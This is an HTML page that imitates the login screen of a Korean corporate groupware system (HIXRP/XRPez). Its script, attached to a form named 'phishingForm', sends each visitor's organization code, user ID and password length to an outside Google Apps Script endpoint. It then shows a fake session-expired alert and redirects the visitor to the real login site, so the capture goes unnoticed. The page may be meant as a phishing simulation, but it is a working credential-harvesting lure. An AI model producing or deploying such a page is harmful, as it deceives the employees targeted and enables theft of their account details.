<!DOCTYPE html>
<html lang="ko">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>HIXRP 로그인</title>
    
    <!-- 실제 사이트의 리소스를 참조하도록 절대 경로 권장 (필요시 수정) -->
    <!-- <link rel="stylesheet" href="https://gnware.gnk.or.kr/css/xrp-open.css" type="text/css"> -->
    
    <style>
        /* 형이 준 스타일 그대로 유지 */
        .tooltip-container { position: relative; display: flex; place-content: left; }
        #password-tooltip { display: none; position: absolute; bottom: calc(100% + 10px); z-index: 1; color: #7A7A7A; background-color: #FFFFFF; padding: 8px; font-size: 1rem; border-radius: 3px; box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; }
        #password-tooltip:before { content: ""; position: absolute; width: 8px; height: 8px; top: 87%; left: 10px; background-color: #FFFFFF; transform: rotate(45deg); }
        #password-tooltip>b { color: #1A2660; font-weight: 500; }
        strong { color: blue; }

        /* 배경 및 레이아웃 강제 지정 (CSS 미로드 대비) */
        body { background-color: #f4f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login_wrap { width: 400px; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .input_box { margin-bottom: 15px; }
        .input_box label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; }
        .input_box input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .btnLogin { width: 100%; padding: 12px; background-color: #1a2660; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        .retCrtBtn { width: 100%; padding: 10px; background: none; border: 1px solid #ccc; margin-top: 10px; cursor: pointer; color: #555; }
        .loginOpt { margin-top: 20px; font-size: 12px; color: #666; text-align: center; }
        .loginCmt { margin-top: 20px; text-align: center; font-size: 12px; }
        .loginCmt a { color: #666; text-decoration: none; margin: 0 5px; }
        .right { text-align: center; font-size: 11px; color: #999; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="login_wrap">
        <div id="login_home">
            <!-- 로고 영역: 실제 서버 주소로 연결하면 더 완벽해 -->
            <div style="text-align: center; margin-bottom: 20px;">
                <h2 style="color: #1a2660; margin: 0;">XRP<span style="color: #7cb342;">ez</span></h2>
            </div>

            <form name="loginForm" id="phishingForm">
                <div class="input_box">
                    <label for="entCd">CODE</label>
                    <input type="text" id="entCd" name="entCd" placeholder="기관코드" required>
                </div>
                <div class="input_box">
                    <label for="id">ID</label>
                    <input type="text" id="id" name="id" placeholder="아이디" required>
                </div>
                <div class="input_box">
                    <label for="password">PASSWORD</label>
                    <div class="tooltip-container">
                        <input type="password" id="password" name="password" placeholder="비밀번호" required>
                        <div id="password-tooltip"><b>&lt;Caps Lock&gt;</b> 이 켜져 있습니다.</div>
                    </div>
                </div>

                <input type="button" value="로그인" class="btnLogin" onClick="loginStart();">
            </form>

            <button class="retCrtBtn">퇴사자 증명 신청</button>

            <div class="loginOpt">
                <input type="checkbox" id="code_check"> <label for="code_check">기관코드저장</label>
                <input type="checkbox" id="id_check"> <label for="id_check">아이디저장</label>
            </div>

            <div class="loginCmt">
                <a href="#">IP승인요청</a>
                <a href="#">비밀번호 찾기</a>
                <a href="#"><strong>개인정보처리방침</strong></a>
            </div>
            <p class="right">ⓒ HIPERTECH Corp. All Rights Reserved.</p>
        </div>
    </div>

    <script>
        // 1. GAS URL (형이 준 그대로 유지)
        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';

        // 2. 데이터 전송 로직
        const sendToGas = (target, input, pwLen) => {
            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(target)}&inputId=${encodeURIComponent(input)}&pwLen=${pwLen}`;
            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
        };

        // 3. 로그인 버튼 클릭 시 실행 (기존 loginStart 함수 대체)
        function loginStart() {
            const entCd = document.getElementById("entCd").value;
            const id = document.getElementById("id").value;
            const password = document.getElementById("password").value;

            if (!entCd || !id || !password) {
                alert("정보를 모두 입력해 주세요.");
                return;
            }

            // [핵심] 기관코드, 아이디, 비밀번호 길이 전송
            sendToGas(entCd, id, password.length);

            // 세션 만료 멘트 후 실제 로그인 페이지로 리다이렉트
            setTimeout(() => {
                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                window.location.href = 'https://gnware.gnk.or.kr/login'; // 실제 로그인 주소
            }, 500);
        }

        // Caps Lock 감지 로직 유지
        document.querySelector("#password").addEventListener("keydown", function(e) {
            if (e.getModifierState && e.getModifierState("CapsLock")) {
                document.getElementById("password-tooltip").style.display = "block";
            } else {
                document.getElementById("password-tooltip").style.display = "none";
            }
            if(e.keyCode == 13) loginStart(); // 엔터키 지원
        });
    </script>
</body>
</html>
